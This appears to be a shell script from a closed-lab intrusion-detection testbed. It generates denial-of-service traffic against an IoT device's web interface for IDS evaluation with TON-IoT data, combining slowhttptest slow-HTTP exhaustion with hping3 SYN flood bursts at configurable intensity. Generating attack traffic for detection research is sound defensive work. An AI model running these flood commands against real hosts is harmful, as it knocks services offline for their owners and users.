#!/bin/sh
# IoT DoS simulation — generates a denial-of-service traffic signature against a
# home-network device for IDS (TON-IoT) evaluation in the closed lab.
echo "[IOT-DOS] Starting..."
TARGET="${TARGET_HOST:-172.20.0.10}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

# Intensity -> concurrent connections / flood packets / pause between bursts.
# Kept modest on purpose: the signature must be clear but still yield only a few
# hundred flows so CICFlowMeter processes each capture in ~1-2s (not minutes).
case "$INTENSITY" in
    low)    CONN=40;  FLOOD=100;  SLEEP_MAX=6 ;;
    high)   CONN=150; FLOOD=400;  SLEEP_MAX=2 ;;
    *)      CONN=80;  FLOOD=200;  SLEEP_MAX=4 ;;  # medium
esac

while [ $(date +%s) -lt $END ]; do
    # Slow-HTTP style resource exhaustion against the device web interface
    slowhttptest -c $CONN -H \
        -o /tmp/iot_dos_output \
        -i 10 -r 200 -t GET \
        -u "http://$TARGET/" \
        -x 24 -p 3 -l 30 2>/dev/null
    # Short SYN flood burst to amplify the DoS signature
    hping3 -S -p 80 -i u1000 -c $FLOOD $TARGET 2>/dev/null
    sleep $((RANDOM % SLEEP_MAX + 1))
done
echo "[IOT-DOS] Done."
